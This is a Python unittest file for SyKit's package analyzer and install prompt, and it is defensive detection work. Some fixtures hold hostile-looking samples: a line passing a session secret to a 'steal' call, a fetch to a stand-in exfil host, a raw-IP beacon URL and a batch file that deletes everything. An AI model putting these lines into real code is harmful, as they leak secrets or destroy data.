from __future__ import annotations

import contextlib
import io
import json
import tempfile
import unittest
from pathlib import Path
from unittest import mock

import package
import package_analysis


class AnalyzerRuleTests(unittest.TestCase):
    """Every detection rule fires on a minimal fixture package."""

    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory(prefix="sykit-analysis-test-")
        self.root = Path(self.temporary.name)
        self.counter = 0

    def tearDown(self) -> None:
        self.temporary.cleanup()

    def make_package(
        self,
        *,
        add: dict[str, bytes | str] | None = None,
        edit: dict[str, bytes | str] | None = None,
        edit_json: dict[str, object] | None = None,
        remove: list[str] | None = None,
    ) -> Path:
        self.counter += 1
        source = self.root / f"fixture-{self.counter}"
        source.mkdir()
        (source / package.MANIFEST_NAME).write_text(
            json.dumps({"id": f"fixture-{self.counter}"}), encoding="utf-8"
        )
        for section, files in (("add", add), ("edit", edit)):
            for relative, content in (files or {}).items():
                path = source / section / Path(relative)
                path.parent.mkdir(parents=True, exist_ok=True)
                if isinstance(content, bytes):
                    path.write_bytes(content)
                else:
                    path.write_text(content, encoding="utf-8")
        for relative, spec in (edit_json or {}).items():
            path = source / "edit" / Path(relative + ".json")
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(json.dumps(spec), encoding="utf-8")
        if remove is not None:
            remove_root = source / "remove"
            remove_root.mkdir(exist_ok=True)
            (remove_root / "paths.json").write_text(
                json.dumps(remove), encoding="utf-8"
            )
        return source

    def analyze(self, source: Path) -> list[package_analysis.Finding]:
        operations = package_analysis.collect_operations(source)
        return package_analysis.analyze_operations(operations)

    def coded(
        self, findings: list[package_analysis.Finding]
    ) -> set[tuple[str, str, str]]:
        return {(f.severity, f.code, f.path) for f in findings}

    def test_core_edit_flags_package_handler(self) -> None:
        source = self.make_package(edit={"package.py": "x = 1\n"})
        findings = self.analyze(source)
        coded = self.coded(findings)
        self.assertIn(("critical", "core-edit", "package.py"), coded)
        self.assertIn(("warning", "replace-file", "package.py"), coded)
        details = [f.detail for f in findings if f.code == "core-edit"]
        self.assertTrue(any("package handler" in detail for detail in details))

    def test_core_covers_sykit_folder_and_analyzer_modules(self) -> None:
        source = self.make_package(
            add={"sykit/helper.py": "x = 1\n"},
            edit={"package_analysis.py": "x = 1\n"},
        )
        coded = self.coded(self.analyze(source))
        self.assertIn(("critical", "core-edit", "sykit/helper.py"), coded)
        self.assertIn(("critical", "core-edit", "package_analysis.py"), coded)

    def test_config_edit_is_its_own_critical(self) -> None:
        source = self.make_package(edit={"sykit/config.json": "{}"})
        findings = self.analyze(source)
        coded = self.coded(findings)
        self.assertIn(("critical", "config-edit", "sykit/config.json"), coded)
        self.assertNotIn(("critical", "core-edit", "sykit/config.json"), coded)

    def test_ci_and_deps_edits_are_critical(self) -> None:
        source = self.make_package(
            add={".github/workflows/evil.yml": "on: push\n"},
            edit={"requirements.txt": "evil-package\n"},
        )
        coded = self.coded(self.analyze(source))
        self.assertIn(("critical", "ci-edit", ".github/workflows/evil.yml"), coded)
        self.assertIn(("critical", "deps-edit", "requirements.txt"), coded)

    def test_remove_of_core_file_is_critical(self) -> None:
        source = self.make_package(remove=["help.py"])
        coded = self.coded(self.analyze(source))
        self.assertIn(("critical", "core-edit", "help.py"), coded)
        self.assertIn(("warning", "remove", "help.py"), coded)

    def test_added_core_file_is_critical(self) -> None:
        # remove + add-back across packages must never dodge the core rule.
        source = self.make_package(add={"package.py": "x = 1\n"})
        coded = self.coded(self.analyze(source))
        self.assertIn(("critical", "core-edit", "package.py"), coded)

    def test_anchored_edit_does_not_flag_replace_file(self) -> None:
        source = self.make_package(
            edit={"docs/notes.md": "placeholder\n"},
            edit_json={"docs/notes.md": [{"action": "append", "content": "extra\n"}]},
        )
        findings = self.analyze(source)
        self.assertNotIn("replace-file", {f.code for f in findings})

    def test_explicit_replace_file_action_flags(self) -> None:
        source = self.make_package(
            edit={"docs/notes.md": "new content\n"},
            edit_json={"docs/notes.md": [{"action": "replace-file"}]},
        )
        coded = self.coded(self.analyze(source))
        self.assertIn(("warning", "replace-file", "docs/notes.md"), coded)

    def test_url_classification(self) -> None:
        source = self.make_package(
            add={
                "files/a.py": "URL = 'https://example-metrics.io/x'\n",
                "files/b.py": "URL = 'https://github.com/Kasterfly/SyKit'\n",
                "docs/c.md": "See https://random-blog.example.com/post\n",
                "files/d.py": "URL = 'http://203.0.113.9/beacon'\n",
            }
        )
        findings = [f for f in self.analyze(source) if f.code == "url"]
        by_path = {f.path: f for f in findings}
        self.assertEqual(by_path["files/a.py"].severity, "warning")
        self.assertEqual(by_path["files/b.py"].severity, "info")
        self.assertEqual(by_path["docs/c.md"].severity, "info")
        self.assertEqual(by_path["files/d.py"].severity, "warning")
        self.assertIn("raw IP", by_path["files/d.py"].detail)

    def test_http_url_on_allowlisted_host_stays_warning(self) -> None:
        source = self.make_package(add={"files/a.py": "URL = 'http://github.com/x'\n"})
        findings = [f for f in self.analyze(source) if f.code == "url"]
        self.assertEqual(findings[0].severity, "warning")

    def test_url_findings_are_capped_per_file(self) -> None:
        urls = "\n".join(
            f"# https://host-{number}.example.com/path" for number in range(9)
        )
        source = self.make_package(add={"files/many.py": urls + "\n"})
        findings = [f for f in self.analyze(source) if f.code == "url"]
        self.assertEqual(len(findings), package_analysis.MAX_URL_FINDINGS_PER_FILE + 1)
        self.assertIn("more URL", findings[-1].detail)

    def test_exec_call_only_flags_code_files(self) -> None:
        source = self.make_package(
            add={
                "files/a.py": "import subprocess\n",
                "docs/b.txt": "the word subprocess is fine in prose\n",
            }
        )
        findings = [f for f in self.analyze(source) if f.code == "exec-call"]
        self.assertEqual([f.path for f in findings], ["files/a.py"])

    def test_script_file_warning_covers_non_python_payloads(self) -> None:
        source = self.make_package(add={"tools/run.bat": "del /q *.*\n"})
        coded = self.coded(self.analyze(source))
        self.assertIn(("warning", "script-file", "tools/run.bat"), coded)

    def test_env_read_and_session_secret(self) -> None:
        source = self.make_package(
            add={
                "files/a.py": "import os\nvalue = os.environ['PATH']\n",
                "files/b.js": "steal(process.env.SYKIT_SESSION_SECRET);\n",
            }
        )
        findings = [f for f in self.analyze(source) if f.code == "env-read"]
        paths = {f.path for f in findings}
        self.assertEqual(paths, {"files/a.py", "files/b.js"})
        secret = [f for f in findings if "SYKIT_SESSION_SECRET" in f.detail]
        self.assertEqual([f.path for f in secret], ["files/b.js"])

    def test_opaque_blob_literal_and_binary_file(self) -> None:
        blob = "QUJD" * 100
        source = self.make_package(
            add={
                "files/blob.py": f"DATA = '{blob}'\n",
                "files/raw.bin": b"\xff\xfe\x00payload",
            }
        )
        findings = [f for f in self.analyze(source) if f.code == "opaque-blob"]
        paths = {f.path for f in findings}
        self.assertEqual(paths, {"files/blob.py", "files/raw.bin"})

    def test_git_and_editor_config_warnings(self) -> None:
        source = self.make_package(
            add={
                ".gitmodules": "[submodule]\n",
                ".vscode/tasks.json": "{}",
            }
        )
        coded = self.coded(self.analyze(source))
        self.assertIn(("warning", "git-remote-config", ".gitmodules"), coded)
        self.assertIn(("warning", "editor-config", ".vscode/tasks.json"), coded)

    def test_payload_inside_instruction_json_is_scanned(self) -> None:
        source = self.make_package(
            edit={"files/main.py": "x = 1\n"},
            edit_json={
                "files/main.py": [
                    {
                        "action": "insert-after",
                        "anchor": "x = 1",
                        "content": "fetch('https://exfil.example.net/x')",
                    }
                ]
            },
        )
        findings = [f for f in self.analyze(source) if f.code == "url"]
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "warning")

    def test_instruction_json_is_not_treated_as_payload(self) -> None:
        # The .json companion itself contains a URL-looking string in a field
        # the analyzer does not scan (the anchor); only introduced content is.
        source = self.make_package(
            edit={"docs/notes.md": "clean\n"},
            edit_json={
                "docs/notes.md": [
                    {
                        "action": "replace",
                        "anchor": "https://anchor-not-content.example.com",
                        "content": "clean",
                    }
                ]
            },
        )
        findings = [f for f in self.analyze(source) if f.code == "url"]
        self.assertEqual(findings, [])

    def test_clean_package_has_no_findings(self) -> None:
        source = self.make_package(add={"docs/notes/hello.txt": "hello\n"})
        self.assertEqual(self.analyze(source), [])

    def test_sanitize_strips_control_and_bidi_characters(self) -> None:
        hostile = "a\x1b[31mb\u202ec\u200bd\x00"
        cleaned = package._sanitize_text(hostile)
        self.assertEqual(cleaned, "a?[31mb?c?d?")

    def test_render_details_shows_introduced_content(self) -> None:
        source = self.make_package(add={"files/a.py": "print('hi')\n"})
        operations = package_analysis.collect_operations(source)
        lines = package_analysis.render_details(operations)
        self.assertIn("=== add files/a.py ===", lines)
        self.assertIn("print('hi')", lines)


class PromptTests(unittest.TestCase):
    """The confirmation prompt and its flags around package add."""

    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory(prefix="sykit-prompt-test-")
        self.root = Path(self.temporary.name)
        self.tool = self.root / "SyKit"
        self.sources = self.root / "sources"
        self.tool.mkdir()
        self.sources.mkdir()
        (self.tool / "package.py").write_text("x = 1\n", encoding="utf-8")
        self.original_paths = (
            package.TOOL_DIR,
            package.PACKAGES_DIR,
            package.INDEX_PATH,
            package.AUTHORS_PATH,
        )
        package.TOOL_DIR = self.tool
        package.PACKAGES_DIR = self.tool / ".packages"
        package.INDEX_PATH = package.PACKAGES_DIR / "index.json"
        package.AUTHORS_PATH = package.PACKAGES_DIR / "authors.md"

    def tearDown(self) -> None:
        (
            package.TOOL_DIR,
            package.PACKAGES_DIR,
            package.INDEX_PATH,
            package.AUTHORS_PATH,
        ) = self.original_paths
        self.temporary.cleanup()

    def make_package(
        self,
        folder: str,
        package_id: str,
        *,
        add: dict[str, str] | None = None,
        edit: dict[str, str] | None = None,
    ) -> Path:
        source = self.sources / folder
        source.mkdir()
        (source / package.MANIFEST_NAME).write_text(
            json.dumps({"id": package_id}), encoding="utf-8"
        )
        for section, files in (("add", add), ("edit", edit)):
            for relative, content in (files or {}).items():
                path = source / section / Path(relative)
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text(content, encoding="utf-8")
        return source

    def add(self, source: Path, **keywords: bool) -> bool:
        with contextlib.redirect_stdout(io.StringIO()) as output:
            result = package._command_add(str(source), **keywords)
        self.output = output.getvalue()
        return result

    def test_empty_answer_defaults_to_no(self) -> None:
        source = self.make_package("clean", "clean", add={"x.txt": "x"})
        with mock.patch("builtins.input", return_value=""):
            self.assertFalse(self.add(source))
        self.assertFalse((self.tool / "x.txt").exists())
        self.assertEqual(package._load_index(), [])
        self.assertFalse(package.PACKAGES_DIR.exists())
        self.assertIn("Aborted; no changes were made.", self.output)

    def test_closed_stdin_aborts_without_traceback(self) -> None:
        source = self.make_package("eof", "eof", add={"x.txt": "x"})
        with mock.patch("builtins.input", side_effect=EOFError):
            self.assertFalse(self.add(source))
        self.assertFalse((self.tool / "x.txt").exists())

    def test_yes_answer_installs(self) -> None:
        source = self.make_package("yes", "yes-package", add={"x.txt": "x"})
        with mock.patch("builtins.input", return_value="y"):
            self.assertTrue(self.add(source))
        self.assertTrue((self.tool / "x.txt").is_file())
        self.assertEqual(package._load_index(), ["yes-package"])

    def test_diff_answer_shows_content_then_aborts(self) -> None:
        source = self.make_package("diff", "diff", add={"x.txt": "payload-text"})
        with mock.patch("builtins.input", side_effect=["d", "n"]):
            self.assertFalse(self.add(source))
        self.assertIn("=== add x.txt ===", self.output)
        self.assertIn("payload-text", self.output)
        self.assertFalse((self.tool / "x.txt").exists())

    def test_assume_yes_skips_prompt_for_clean_package(self) -> None:
        source = self.make_package("auto", "auto", add={"x.txt": "x"})
        with mock.patch("builtins.input", side_effect=AssertionError):
            self.assertTrue(self.add(source, assume_yes=True))
        self.assertTrue((self.tool / "x.txt").is_file())

    def test_critical_refuses_even_interactive_yes_without_allow_core(self) -> None:
        source = self.make_package("core", "core", edit={"package.py": "y = 2\n"})
        with mock.patch("builtins.input", side_effect=AssertionError):
            self.assertFalse(self.add(source))
        self.assertIn("--allow-core", self.output)
        self.assertEqual(
            (self.tool / "package.py").read_text(encoding="utf-8"), "x = 1\n"
        )

    def test_assume_yes_is_blocked_by_critical_without_allow_core(self) -> None:
        source = self.make_package("core2", "core2", edit={"package.py": "y = 2\n"})
        self.assertFalse(self.add(source, assume_yes=True))
        self.assertEqual(
            (self.tool / "package.py").read_text(encoding="utf-8"), "x = 1\n"
        )

    def test_allow_core_with_yes_installs_critical_package(self) -> None:
        source = self.make_package("core3", "core3", edit={"package.py": "y = 2\n"})
        self.assertTrue(self.add(source, assume_yes=True, allow_core=True))
        self.assertEqual(
            (self.tool / "package.py").read_text(encoding="utf-8"), "y = 2\n"
        )

    def test_report_is_printed_before_prompt(self) -> None:
        source = self.make_package(
            "report", "report", add={"a.py": "import subprocess\n"}
        )
        with mock.patch("builtins.input", return_value="n"):
            self.assertFalse(self.add(source))
        self.assertIn("exec-call", self.output)
        self.assertIn("Package: report (report)", self.output)

    def test_reapply_during_removal_never_prompts(self) -> None:
        first = self.make_package("first", "first", add={"one.txt": "1"})
        second = self.make_package("second", "second", add={"two.txt": "2"})
        self.assertTrue(self.add(first, assume_yes=True))
        self.assertTrue(self.add(second, assume_yes=True))
        with mock.patch("builtins.input", side_effect=AssertionError):
            with contextlib.redirect_stdout(io.StringIO()):
                package._command_remove("first")
        self.assertEqual(package._load_index(), ["second"])
        self.assertFalse((self.tool / "one.txt").exists())
        self.assertTrue((self.tool / "two.txt").is_file())

    def test_case_colliding_targets_are_refused(self) -> None:
        # Both spellings resolve to files on every platform: one shared file
        # on case-insensitive filesystems, two files on case-sensitive ones.
        (self.tool / "Data.txt").write_text("x", encoding="utf-8")
        (self.tool / "data.txt").write_text("x", encoding="utf-8")
        source = self.make_package("collide", "collide")
        remove_root = source / "remove"
        remove_root.mkdir()
        (remove_root / "paths.json").write_text(
            '["Data.txt", "data.txt"]', encoding="utf-8"
        )
        with self.assertRaisesRegex(package.PackageError, "ignoring case"):
            with contextlib.redirect_stdout(io.StringIO()):
                package._command_add(str(source), assume_yes=True)

    def test_run_parses_add_flags(self) -> None:
        source = self.make_package("flags", "flags", add={"x.txt": "x"})
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertTrue(package.run(["add", str(source), "--yes"]))
        self.assertTrue((self.tool / "x.txt").is_file())

    def test_run_rejects_unknown_flags(self) -> None:
        source = self.make_package("badflag", "badflag", add={"x.txt": "x"})
        with contextlib.redirect_stdout(io.StringIO()) as output:
            self.assertFalse(package.run(["add", str(source), "--no-warn"]))
        self.assertIn("Unknown package add option", output.getvalue())
        self.assertFalse((self.tool / "x.txt").exists())


class ProvenanceTests(unittest.TestCase):
    """Install records carry provenance and stay backward compatible."""

    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory(prefix="sykit-prov-test-")
        self.root = Path(self.temporary.name)
        self.tool = self.root / "SyKit"
        self.sources = self.root / "sources"
        self.tool.mkdir()
        self.sources.mkdir()
        self.original_paths = (
            package.TOOL_DIR,
            package.PACKAGES_DIR,
            package.INDEX_PATH,
            package.AUTHORS_PATH,
        )
        package.TOOL_DIR = self.tool
        package.PACKAGES_DIR = self.tool / ".packages"
        package.INDEX_PATH = package.PACKAGES_DIR / "index.json"
        package.AUTHORS_PATH = package.PACKAGES_DIR / "authors.md"
        source = self.sources / "sample"
        source.mkdir()
        (source / package.MANIFEST_NAME).write_text(
            json.dumps({"id": "sample"}), encoding="utf-8"
        )
        payload = source / "add" / "sample.txt"
        payload.parent.mkdir(parents=True)
        payload.write_text("sample", encoding="utf-8")
        self.source = source

    def tearDown(self) -> None:
        (
            package.TOOL_DIR,
            package.PACKAGES_DIR,
            package.INDEX_PATH,
            package.AUTHORS_PATH,
        ) = self.original_paths
        self.temporary.cleanup()

    def install(self) -> None:
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertTrue(package._command_add(str(self.source), assume_yes=True))

    def record_path(self) -> Path:
        return package.PACKAGES_DIR / "sample" / package.RECORD_NAME

    def test_local_install_records_provenance(self) -> None:
        self.install()
        record = json.loads(self.record_path().read_text(encoding="utf-8"))
        source = record["source"]
        self.assertEqual(source["kind"], "local")
        self.assertIsNone(source["resolved_sha"])
        self.assertTrue(source["content_hash"].startswith("sha256:"))
        expected = package._hash_package_folder(self.source)
        self.assertEqual(source["content_hash"], expected)

    def test_list_shows_source_line(self) -> None:
        self.install()
        with contextlib.redirect_stdout(io.StringIO()) as output:
            package._command_list()
        self.assertIn("source: local", output.getvalue())

    def test_legacy_string_source_still_lists_and_removes(self) -> None:
        self.install()
        record = json.loads(self.record_path().read_text(encoding="utf-8"))
        record["source"] = "sources/sample"
        self.record_path().write_text(
            json.dumps(record, indent=4) + "\n", encoding="utf-8"
        )
        with contextlib.redirect_stdout(io.StringIO()) as output:
            package._command_list()
        self.assertIn("source: local", output.getvalue())
        with contextlib.redirect_stdout(io.StringIO()):
            package._command_remove("sample")
        self.assertEqual(package._load_index(), [])
        self.assertFalse((self.tool / "sample.txt").exists())

    def test_provenance_survives_reapply_during_removal(self) -> None:
        self.install()
        other = self.sources / "other"
        other.mkdir()
        (other / package.MANIFEST_NAME).write_text(
            json.dumps({"id": "other"}), encoding="utf-8"
        )
        payload = other / "add" / "other.txt"
        payload.parent.mkdir(parents=True)
        payload.write_text("other", encoding="utf-8")
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertTrue(package._command_add(str(other), assume_yes=True))
        other_record_path = package.PACKAGES_DIR / "other" / package.RECORD_NAME
        before = json.loads(other_record_path.read_text(encoding="utf-8"))

        # Removing "sample" unwinds and re-applies "other" from its stored
        # copy; the re-applied record must keep its provenance object.
        with contextlib.redirect_stdout(io.StringIO()):
            package._command_remove("sample")

        after = json.loads(other_record_path.read_text(encoding="utf-8"))
        self.assertEqual(before["source"], after["source"])
        self.assertEqual(after["source"]["kind"], "local")


if __name__ == "__main__":
    unittest.main()
